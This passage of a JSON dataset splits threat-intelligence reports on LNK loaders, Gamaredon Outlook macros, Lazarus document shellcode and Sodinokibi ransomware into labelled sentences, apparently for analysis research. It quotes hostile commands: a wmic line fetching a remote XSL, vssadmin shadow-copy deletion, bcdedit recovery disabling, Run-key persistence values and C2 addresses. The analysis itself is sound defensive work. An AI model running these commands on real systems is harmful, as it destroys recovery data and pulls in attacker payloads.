        "id": "cti_reports_filtered/r-385.md:::S3",
        "text": "- \"Project link and New copyright policy.rar\"\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-385.md:::S4",
        "text": "Both RAR archives bundle two malicious LNK files.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-385.md:::S5",
        "text": "In the newer variant (CV_Colliers.rar), the LNK files are disguised as a Curriculum Vitae (CV) and International English Language Testing System (IELTS) exam results.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-385.md:::S6",
        "text": "The older one (Project link and New copyright policy.rar) seems to target product teams that are using zeplin.io.\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-385.md:::S7",
        "text": "The following shows the overall process flow when executing the malicious LNK file.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-385.md:::S8",
        "text": "The LNK file contains a list of commands that will be executed upon running, and a blob that is a base64 encoded compressed payload.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-385.md:::S9",
        "text": "Here is the list of commands that will be executed:\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-385.md:::S10",
        "text": "- Copy content of the LNK file into \"g4ZokyumB2DC4.tmp\" in %APPDATA% temp directory.\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-385.md:::S11",
        "text": "- Copy content of \"certutil.exe\" into \"gosia.exe\" ( \"*ertu*.exe is used to bypass security detection).",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-385.md:::S12",
        "text": "- Look for the base64 blob using \"findstr.exe\" and write it to \"cSi1rouy4.tmp\".\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-385.md:::S13",
        "text": "- Decode content of \"cSi1rouy4.tmp\" using \"gosia.exe -decode\" (certutil.exe -decode) and write it to \"o423DFDS4.tmp\".\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-385.md:::S14",
        "text": "- Decompress content of \"o423DFDS4.tmp\" in temp directory along with a decoy PDF document using \"expand.exe -F:*\" (Figure 3) .\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-385.md:::S15",
        "text": "- Copy \"66DF3DFG.tmp\" and \"34fDKfSD38.js\" files into \"C:\\Users\\Public\\Downloads\" directory.\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-385.md:::S16",
        "text": "- Execute the JS file by calling Wscript.\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-385.md:::S17",
        "text": "- Open the decoy document.\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-385.md:::S18",
        "text": "The list of commands executed by this LNK shortcut is the same as the one reported by Anomali on the Higasia Covid-19 campaign.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-385.md:::S19",
        "text": "The only difference is the name of the tmp files and name of certutil.exe which in this new case is \"gosia.exe\", while in the March campaign the name was \"mosia.exe\".\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-385.md:::S20",
        "text": "Both LNK files embedded within the archive are executing similar commands with the different Command and Control (C&C) configurations.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-385.md:::S21",
        "text": "Running each of them would show a different decoy document.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-385.md:::S22",
        "text": "The JavaScript file performs the following commands:\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-385.md:::S23",
        "text": "- Create \"d3reEW.exe\" in \"C:\\Users\\Public\\Downloads\" and store \"cmd /c ipconfig\" in it.\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-385.md:::S24",
        "text": "- Execute the dropped \"svchast.exe\".\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-385.md:::S25",
        "text": "- Copy \"svchhast.exe\" into startup directory and rename it as \"officeupdate.exe\".\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-385.md:::S26",
        "text": "- Add \"officeupdate.exe\" to scheduled tasks.\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-385.md:::S27",
        "text": "- Send a POST request to a hardcoded URL with \"d3reEW.exe\" as data.\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-385.md:::S28",
        "text": "Svchast.exe is a small loader that loads the content of the shellcode stored in \"66DF3DFG.tmp\".\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-385.md:::S29",
        "text": "In fact, this shellcode is a wrapper around the final shellcode.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-385.md:::S30",
        "text": "It performs some checks and then calls the final shellcode.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-385.md:::S31",
        "text": "The final shellcode dynamically resolves the imports and allocates memory for the content that will be executed.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-385.md:::S32",
        "text": "Finally it calls \"CreateThread\" to create a thread within its memory space to make HTTPS requests to its C&C server.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-385.md:::S33",
        "text": "At the time of analysis, the server was down so we weren't able to clearly identify the ultimate goal of this attack.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-385.md:::S34",
        "text": "While most malware campaigns use a simple decoy document that typically retrieves a malware payload, more advanced attackers will often try unconventional means to infect their victims.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-385.md:::S35",
        "text": "We reproduced this attack in our lab using an email as the infection vector, as we surmise that victims were spear-phished.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-385.md:::S36",
        "text": "Malwarebytes (in this case the Nebula business version) stopped the LNK file execution from WinRAR and therefore completely stopped the attack.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-398.md:::S0",
        "text": "The Gamaredon group uses a package that includes a custom Microsoft Outlook Visual Basic for Applications (VBA) project.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-398.md:::S1",
        "text": "Using Outlook macros to deliver malware is something we rarely see while investigating malicious campaigns.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-398.md:::S2",
        "text": "This bundle of malicious code starts out with a VBScript that first kills the Outlook process if it is running, and then removes security around VBA macro execution in Outlook by changing registry values.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-398.md:::S3",
        "text": "It also saves to disk the malicious OTM file (Outlook VBA project) that contains a macro, the malicious email attachment and, in some cases, a list of recipients that the emails should be sent to.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-398.md:::S4",
        "text": "Next, it relaunches Outlook with a special option, /altvba <OTM filename>, which loads the Gamaredon VBA project.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-398.md:::S5",
        "text": "The malicious code is executed once the Application.Startup event is received.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-398.md:::S6",
        "text": "They have been using this module in three different ways to send malicious email to:\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-398.md:::S7",
        "text": "- Everyone in the victim\u2019s address book",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-398.md:::S8",
        "text": "- Everyone within the same organization\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-398.md:::S9",
        "text": "- A predefined list of targets",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-398.md:::S10",
        "text": "While abusing a compromised mailbox to send malicious emails without the victim\u2019s consent is not a new technique, we believe this is the first publicly documented case of an attack group using an OTM file and Outlook macro to achieve it.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-398.md:::S11",
        "text": "Based on the \u201csend to all in contact list\u201d behavior of this malicious VBA code, we believe that this module might have led some organizations to think they were targeted by Gamaredon when they were merely collateral damage.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-398.md:::S12",
        "text": "For example, recent samples uploaded to VirusTotal coming from regions that are not traditionally targeted by Gamaredon, such as Japan, could be explained by the actions of this module.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-398.md:::S13",
        "text": "As seen in Figure 2, the VBA code builds the email body and attaches the malicious document to the email.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-398.md:::S14",
        "text": "We\u2019ve seen both .docx and .lnk files being used as attachments.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-398.md:::S15",
        "text": "These are very similar to the content of the malicious attachments used in Gamaredon\u2019s initial spearphishing campaigns.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-398.md:::S16",
        "text": "Figure 3 shows an email generated by this malicious component.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-398.md:::S17",
        "text": "The email contains both English and Russian text.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-398.md:::S18",
        "text": "However, as illustrated in Figure 3, there is a problem with the Russian encoding.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-398.md:::S19",
        "text": "This was fixed in a later version of this module \u2014 another example of the Gamaredon group\u2019s fast development pace and apparent lack of attention to detail.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-414.md:::S0",
        "text": "We identified two phishing documents: \u201cLockheed_Martin_JobOpportunities.docx\u201d and \u201cSalary_Lockheed_Martin_job_opportunities_confidential.doc\u201d.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-414.md:::S1",
        "text": "Both variants were authored by the same user, named \u201cMickey\u201d.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-414.md:::S2",
        "text": "The methodology used for control flow hijack and the macro content is similar across both samples.\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-414.md:::S3",
        "text": "The macro uses aliases to rename the APIs that it uses (fig. 2).\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-414.md:::S4",
        "text": "The initial entry point for the macro is via the ActiveX Frame1_Layout to automatically execute once ActiveX control is enabled (fig. 3).",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-414.md:::S5",
        "text": "The macro starts by loading WMVCORE.DLL, which is a legitimate windows dll for windows media.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-414.md:::S6",
        "text": "Interestingly, to make the macro seem more innocuous, Lazarus uses function names identical to the exported functions of WMVCORE.DLL and variable names thematically related to playback (fig. 4).\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-414.md:::S7",
        "text": "The macro uses a check for a document variable before entering its main functionality block.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-414.md:::S8",
        "text": "This variable is set at the end to ensure that subsequent opening of the document does not execute it again.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-414.md:::S9",
        "text": "The second stage payload is shellcode that is embedded as a base64 encoded string array inside the macro that is decoded by using CryptStringToBinaryW (fig. 5).",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-414.md:::S10",
        "text": "Other variants have used the UuidFromStringA function to decode the embedded payload and write it to an executable Heap.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-414.md:::S11",
        "text": "The decoded shellcode then overwrites the WMIsAvailableOffline function from WMVCORE.dll by retrieving its address and changing its memory permissions.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-414.md:::S12",
        "text": "The callback to the shellcode is achieved by retrieving the KernelCallbackTable pointer from the PEB structure of the current process via NtQueryInformationProcess, and then patching the _fnDWORD pointer to point to WMIsAvailableOffline.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-414.md:::S13",
        "text": "Whenever winword makes any graphical call, the shellcode executes.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-414.md:::S14",
        "text": "This technique to hijack control flow has also been used by other sophisticated attackers such as FinFisher.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-414.md:::S15",
        "text": "Lazarus has also used other novel methods to execute shellcode such as by using the function EnumSystemLocalesA as a callback to shellcode written to executable heap.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-414.md:::S16",
        "text": "The macro then sets a document variable to ensure that subsequent runs would not execute the shellcode decode and the KernelCllbackTable hijack again.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-414.md:::S17",
        "text": "It also retrieves a decoy document from https://markettrendingcenter[.]com/lk_job_oppor[.]docx and displays it (fig. 7.)",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-414.md:::S18",
        "text": "The shellcode mainly sets up a periodic beacon out to https://markettrendingcenter[.]com/member[.]htm by creating a new staging folder C:\\WMAuthorization , writing a vbs file (WMVxEncd.vbs) to it, and creating a corresponding Scheduled task to run the vbs file every 20 minutes (fig. 8).",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-414.md:::S19",
        "text": "shellObj is the Wscript.Shell object that the vbs file uses to execute the beacon command.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-414.md:::S20",
        "text": "Here, WMPlaybackSrv is a renamed wscript.exe and WindowsMediaPlayerVxEncdSrv is a renamed mshta.exe.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-414.md:::S21",
        "text": "Another variant of the campaign uses the lolbin wuauclt.\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-414.md:::S22",
        "text": "cmd /C ''C:\\Windows\\system32\\wuauclt.exe' /UpdateDeploymentProvider wuaueng.dll /RunHandlerComServer",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-414.md:::S23",
        "text": "Earlier variants have used a copy of wmic.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-414.md:::S24",
        "text": "%COMSPEC% /c Start /miN c:\\Intel\\hidasvc ENVIRONMENT get STATUS /FORMAT:\u201dhxxps://www.advantims[.]com/GfxCPL.xsl\u201d\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-414.md:::S25",
        "text": "Additional vendors have also identified a variant that uses pcalua.exe.\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-414.md:::S26",
        "text": "Unfortunately, we were unable to get further details about the remote htm payload as it returns a 404 error.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-416.md:::S0",
        "text": "The malicious document contains two payloads as encrypted string arrays embedded in Visual Basic macro code.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-416.md:::S1",
        "text": "The payloads are present as encrypted string arrays that are decrypted in memory, written to disk and launched in sequence (second stage malicious binary launched first and then the decoy document).",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-416.md:::S2",
        "text": "The VBA Macro code is self-executing and configured to execute when the OLE document (MS Word doc) is opened (via \u201cSub AutoOpen()\u201d).",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-416.md:::S3",
        "text": "The AutoOpen() function in the VBA Macro performs the following tasks in the sequence listed:",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-416.md:::S4",
        "text": "- Decodes the target file path of the second stage binary payload.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-416.md:::S5",
        "text": "This file path is calculated based on the current user\u2019s Temp folder location: <temp_dir_path>\\.\\lsm.exe",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-416.md:::S6",
        "text": "- Decodes the second stage binary in memory and writes it to the %temp%\\.\\lsm.exe file location\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-416.md:::S7",
        "text": "- After writing the second stage payload to disk the VBA code performs two important actions.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-416.md:::S8",
        "text": "  - Runs the second stage payload using cmd.exe.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-416.md:::S9",
        "text": "This is done so that the cmd.exe process exists as soon as the payload is launched.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-416.md:::S10",
        "text": "This way a process enumeration tool cannot find the parent process => Smaller footprint.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-416.md:::S11",
        "text": "cmdline for executing the second stage binary: cmd.exe /c start /b <temp_dir_path>\\.\\lsm.exe /haobao\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-416.md:::S12",
        "text": "  - Adds persistence on the system by creating a shortcut in the user\u2019s Startup folder with the correct cmdline arguments:",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-416.md:::S13",
        "text": "    - Link file command line: <temp_dir_path>\\.\\lsm.exe /haobao\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-416.md:::S14",
        "text": "    - Link File Name: GoogleUpdate.lnk",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-416.md:::S15",
        "text": "- Once the second stage payload has been launched, the VBA Macro proceeds to display a decoy document to the end user.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-416.md:::S16",
        "text": "This decoy document is also stored in the VBA Macro as an encrypted string array (similar to the second stage payload).",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-416.md:::S17",
        "text": "The decoy document is again written to the user\u2019s temp directory to the following filename/path: <temp_dir_path>\\.\\Job Description.doc\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-416.md:::S18",
        "text": "- Once the decoy document has been written to disk, the VBA Macro sets its file attributes to System + Hidden",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-416.md:::S19",
        "text": "- The decoy document is then opened by the malicious VBA Macro and the original malicious document\u2019s caption is copied over to the decoy document to trick the end user into mistaking the decoy document for the original (malicious) document.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-416.md:::S20",
        "text": "- This activity, combined with the fact that the VBA Macro then closes the current (malicious) document, indicates that the VBA Macro aims to trick an unsuspecting user into thinking that the decoy document currently open is the original (malicious) document opened by the user.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-416.md:::S21",
        "text": "- Since the decoy document is a benign file and does not contain any macros the victim does not suspect any malicious behavior.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-416.md:::S22",
        "text": "As part of the implant initialization activities the implant does the following;",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-416.md:::S23",
        "text": "- Checks the string passed to it through command line \n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-416.md:::S24",
        "text": "  - \u201c/haobao\u201d in case of 535f212b320df049ae8b8ebe0a4f93e3bd25ed79",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-416.md:::S25",
        "text": "  - \u201c/pumpingcore\u201d in case of e8faa68daf62fbe2e10b3bac775cce5a3bb2999e",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-416.md:::S26",
        "text": "If the malware does not find this string in its cmdline arguments, it simply quits without going any further.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-416.md:::S27",
        "text": "- Unwraps a DLL into memory and calls its one-and-only import using Reflective DLL injection.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-416.md:::S28",
        "text": "DLL information.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-416.md:::S29",
        "text": "During our research, we discovered additional variants of the DLL file.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-416.md:::S30",
        "text": "- As part of Reflective DLL loading the malware performs the following tasks on the DLL it has unwrapped in memory:",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-416.md:::S31",
        "text": "  - Copy the unwrapped DLL into new locations in its own memory space.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-416.md:::S32",
        "text": "  - Build imports required by the DLL (based on the IAT of the DLL)\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-416.md:::S33",
        "text": "- Call the newly loaded DLL image\u2019s Entry Point (DllMain) with DLL_PROCESS_ATTACH to complete successful loading of the DLL in the malware process.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-416.md:::S34",
        "text": "- Call the actual malicious export in the DLL named \u201cCoreDn\u201d\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-416.md:::S35",
        "text": "All the malicious activities described below are performed by the DLL unless specified otherwise.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-416.md:::S36",
        "text": "The implant has the capability of gathering data from the victim\u2019s system.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-416.md:::S37",
        "text": "The following information will be gathered and sent to the command and control server.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-416.md:::S38",
        "text": "- Computer name and currently logged on user\u2019s name, stored in the format <ComputerName> \\ <Username>",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-416.md:::S39",
        "text": "- List of all processes currently running on the system arranged in format <Process Name>\\r\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-416.md:::S40",
        "text": "- The presence of a specific registry key on the system HKEY_CURRENT_USER\\Software\\Bitcoin\\Bitcoin-Qt",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-416.md:::S41",
        "text": "- The malware appends an indicator (flag) specifying whether the above registry key was found in the user\u2019s registry:\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-416.md:::S42",
        "text": "This key is checked again as part of the command and control communication and is sent as a duplicate value to the command and control in the HTTP POST request as well (explained in the below).",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-416.md:::S43",
        "text": "In preparation of the exfiltration of information collected from the endpoint, the malware performs the following activities:",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-416.md:::S44",
        "text": "Encode the collected information using a simple byte based XOR operation using the byte key: 0x34.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-416.md:::S45",
        "text": "Base64 encode (standard) the XORed data.\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-416.md:::S46",
        "text": "Again, check for the presence of the Registry Key: HKCU\\Software\\Bitcoin\\Bitcoin-Qt",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-416.md:::S47",
        "text": "Once the malware has performed all these activities it sends an HTTP POST request to the CnC server:\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-416.md:::S48",
        "text": "- www[dot]worker.co.kr for md5 BDAEDB14723C6C8A4688CC8FC1CFE668",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-416.md:::S49",
        "text": "- www[dot]palgong-cc.co.kr for md5 D4C93B85FFE88DDD552860B148831026",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-416.md:::S50",
        "text": "The persistence mechanism of the malware is performed only for the downloaded implant.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-416.md:::S51",
        "text": "Persistence is established for the implant via the visual basic macro code initially executed upon document loading by the victim.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-416.md:::S52",
        "text": "This persistence is also performed ONLY if the malware successfully executes the downloaded implant.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-416.md:::S53",
        "text": "The malware first tries to update the HKEY_LOCAL_MACHINE registry key.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-416.md:::S54",
        "text": "If the update is unsuccessful then it also tries to update the HKEY_CURRENT_USER registry key.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-416.md:::S55",
        "text": "Value written to registry to achieve persistence on the endpoint:\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-416.md:::S56",
        "text": "- Registry Subkey = Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-416.md:::S57",
        "text": "- Value Name = AdobeFlash\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-416.md:::S58",
        "text": "- Value Content = \u201cC:\\DOCUME~1\\<username>\\LOCALS~1\\Temp\\OneDrive.exe\u201d kLZXlyJelgqUpKzP\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-418.md:::S0",
        "text": "Spearphishing Attachment (ATT&CK T1193) is one of the most used Initial Access techniques used by ransomware families as in Sodinokibi.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-418.md:::S1",
        "text": "Attackers use spam emails with an attached MS Office Word document including a malicious macro to download the ransomware to the target system.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-418.md:::S2",
        "text": "In order to show the lifecycle of Sodinokibi ransomware, we analyzed a Microsoft Word document.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-418.md:::S3",
        "text": "The specific sample analyzed below is Bewerbungsunterlagen_6704760.doc ( SHA-256: fb8b03748b617acf0ee3b138c5b37e74ec396bc73da3362d633862d7283742fd , detection rate is only 33/60 as of today).",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-418.md:::S4",
        "text": "Even though Sodinokibi uses simple obfuscation techniques mentioned below, 30 of 60 antiviruses cannot detect it.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-418.md:::S5",
        "text": "\u201cBewerbungsunterlagen\u201d means \u201capplication document\u201d in German, and the attackers used a CV theme to lure victims into downloading the document.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-418.md:::S6",
        "text": "Sodinokibi is a \u201cRansomware-as-a-Service (RAAS) malware, so its distribution methods vary depending on the attacker distributing it.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-418.md:::S7",
        "text": "Attackers have used the following Initial Access techniques in their other campaigns to deliver Sodinokibi:",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-418.md:::S8",
        "text": "Exploit Public-Facing Application (ATT&CK T1190) : Attackers exploit vulnerabilities in enterprise applications to distribute it, such as the deserialization vulnerability CVE-2019-2725 in Oracle WebLogic Server having a CVSS score of 9.8/10.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-418.md:::S9",
        "text": "Remote Desktop Protocol ( ATT&CK T1076) : Attackers use RDP to deliver Sodinokibi.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-418.md:::S10",
        "text": "This delivery technique can also be classified in External Remote Services ( ATT&CK T1133).",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-418.md:::S11",
        "text": "Supply Chain Compromise ( ATT&CK T1195) : Sodinokibi ransomware was distributed through a compromised version of WinRAR downloaded from the WinRAR Italia website.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-418.md:::S12",
        "text": "Drive-by-Compromise ( ATT&CK T1189): Attackers compromised WordPress sites and injected JavaScript over the content of the original site to spread Sodinokibi.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-418.md:::S13",
        "text": "When a victim opens the document, Microsoft Word asks to enable/disable macros.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-418.md:::S14",
        "text": "It reveals that a macro is embedded in the document (Scripting, ATT&CK T1054).",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-418.md:::S15",
        "text": "The malicious document claims that it was created in an earlier version of Microsoft Office and asks the victim to enable the content, which launches the code hidden in the macros.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-418.md:::S16",
        "text": "When we examined macros in the document, we saw that VBA (Visual Basic for Applications) codes were split into modules and functions for the purpose of obfuscation (Obfuscate\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-418.md:::S17",
        "text": "According to the above functions, fU1 = \"hxxp://54.39.233.132/de1.trp\".",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-418.md:::S18",
        "text": "As we know the fU1 and fP1 parameters, we can understand the following function:",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-418.md:::S19",
        "text": "The second parameter (fU1) is a string value that contains the URL to download, and the third parameter (fP1) is a string value containing the name or full path of the file to create for the download.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-418.md:::S20",
        "text": "Accordingly, this function downloads de1.trp from 54.39.233.132 and saves it to the C:\\Windows\\Temp\\ directory as MicrosoftOfficeWord_upd.v.88735.34.5.exe.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-418.md:::S21",
        "text": "The downloaded file is the Sodinokibi ransomware (SHA-256: 720fbe60f049848f02ba9b2b91926f80ba65b84f0d831a55f4e634c820bd0848, detection rate is 51/69 as of today).",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-418.md:::S22",
        "text": "Its artifacts usually mimic the names of known executables for Defense Evasion, such as a Microsoft Word update file name (MicrosoftOfficeWord_upd.v.88735.34.5.exe) as in this sample (Masquerading, ATT&CK T1036).",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-418.md:::S23",
        "text": "As seen in the above process graph, the macro in the Word document downloads and runs Sodinokibi executable.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-418.md:::S24",
        "text": "After execution, it runs the following command using cmd.exe (Command-Line Interface, ATT&CK T1059):\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-418.md:::S25",
        "text": "At first, this command runs vssadmin.exe to delete all volume shadow copies on the system to prevent recovery (Inhibit System Recovery, ATT&CK T1490) vssadmin.exe Delete Shadows /All /Quiet",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-418.md:::S26",
        "text": "to delete all volume shadow copies on the system to prevent recovery (Inhibit System Recovery, ATT&CK T1490)",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-418.md:::S27",
        "text": "Then, it uses bcdedit.exe twice to disable automatic Windows recovery features by modifying boot configuration data (Inhibit System Recovery, ATT&CK T1490) \n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-418.md:::S28",
        "text": "- bcdedit /set {default} recoveryenabled No",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-418.md:::S29",
        "text": "- bcdedit /set {default} bootstatuspolicy ignoreallfailures",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-418.md:::S30",
        "text": "Sigma rules detecting the above actions are given in the Appendix.\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-418.md:::S31",
        "text": "Like most ransomware, Sodinokibi encrypts files and adds a random extension such as \u201ctest.jpg.1cd8t9ahd5\u201d (Data Encrypted for Impact, ATT&CK T1486).",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-418.md:::S32",
        "text": "It also drops a ransom note in folders that contain encrypted files.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-418.md:::S33",
        "text": "The name of the ransom note is the random extension added to the encrypted files.",
